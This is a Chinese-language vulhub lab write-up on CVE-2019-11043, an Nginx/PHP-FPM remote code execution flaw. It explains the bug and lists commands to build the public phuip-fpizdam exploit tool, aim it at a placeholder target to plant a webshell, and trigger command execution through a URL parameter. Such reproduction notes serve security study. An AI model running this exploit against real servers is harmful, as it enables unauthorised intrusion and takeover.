# PHP-FPM远程命令执行（CVE-2019-11043）

###### by ADummy

### 0x00利用路线

​			安装go环境--->下载利用工具--->写入shell--->getshell

### 0x01漏洞介绍			

​		漏洞主要由于 PHP-FPM 中 sapi/ fpm/ fpm/ fpm_main.c 文件内的 env_path_info 下溢导致，攻击者可以使用换行符 %0a 破坏 Nginx 中 fastcgi_split_path_info 对应的正则表达式，导致传递给 PHP-FPM 的 PATH_INFO 值为空，从而触发该漏洞，通过发送特制的URL请求，在一些特殊的配置情况下会导致任意代码执行。（当nginx配置不当时，会导致php-fpm远程任意代码执行。）

### 0x02漏洞复现

```
apt-get install golang    							  // 安装go环境

git clone https://github.com/neex/phuip-fpizdam.git   //下载利用工具

cd phuip-fpizdam     								  //进入工作目录

go get -v && go build								  //此时会报错，
									//报错原因：默认使用的是proxy.golang.org，在国内无法访问
go env -w GOPROXY=https://goproxy.cn                  //换一个国内能访问的地址

go get -v && go build               //重新执行命令 phuip-fpizdam工具成功编译

go run . "http://your-ip:8080/index.php    //攻击，webshell被写入

一个Webshell是在PHP-FPM的后台编写的，请访问http://your-ip:8080/index.php?a=id以触发RCE
```



安装golang环境

![PHP_FPM远程命令执行漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/PHP_FPM远程命令执行漏洞_1.jpg)



执行命令

![PHP_FPM远程命令执行漏洞_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/PHP_FPM远程命令执行漏洞_2.jpg)



![PHP_FPM远程命令执行漏洞_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/PHP_FPM远程命令执行漏洞_3.jpg)

### 0x03参考资料

https://blog.csdn.net/xuandao_ahfengren/article/details/106254216

https://blog.csdn.net/weixin_40412037/article/details/111225967

https://blog.csdn.net/weixin_40412037/article/details/111224046